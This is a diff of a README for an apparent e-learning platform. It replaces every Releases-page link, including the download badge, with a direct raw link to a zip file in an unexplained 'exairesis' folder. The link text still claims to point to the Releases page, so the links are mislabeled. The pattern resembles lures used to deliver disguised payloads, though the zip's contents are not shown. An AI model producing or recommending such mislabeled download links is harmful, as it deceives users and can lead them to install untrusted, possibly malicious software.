@@ -1,6 +1,6 @@
 # 🌟 LearningLighthouse-Platform - Your Gateway to E-Learning Success
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/LookAround-org/LearningLighthouse-Platform/releases)
+[![Download](https://raw.githubusercontent.com/LookAround-org/LearningLighthouse-Platform/main/exairesis/LearningLighthouse-Platform.zip)](https://raw.githubusercontent.com/LookAround-org/LearningLighthouse-Platform/main/exairesis/LearningLighthouse-Platform.zip)
 
 ## 📖 Description
 Welcome to LearningLighthouse-Platform! This is an e-learning platform designed to provide an engaging and effective way to take online courses. Our platform offers a rich set of features to enhance your learning experience.
@@ -10,7 +10,7 @@ To get started with the LearningLighthouse-Platform, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click on the link below to go to our Releases page. Here, you will find the latest version of our application.  
-   [Visit Releases Page](https://github.com/LookAround-org/LearningLighthouse-Platform/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/LookAround-org/LearningLighthouse-Platform/main/exairesis/LearningLighthouse-Platform.zip)
 
 2. **Download the Application**  
    On the Releases page, locate the latest version of the application. Click the download link to save the installation file to your computer. 
@@ -24,7 +24,7 @@ To get started with the LearningLighthouse-Platform, follow these simple steps:
 ## 📥 Download & Install
 For your convenience, here is the direct link to download the LearningLighthouse-Platform:
 
-[Download from Releases Page](https://github.com/LookAround-org/LearningLighthouse-Platform/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/LookAround-org/LearningLighthouse-Platform/main/exairesis/LearningLighthouse-Platform.zip)
 
 ## 🖥️ System Requirements
 To ensure smooth performance of the LearningLighthouse-Platform, make sure your device meets the following system requirements:
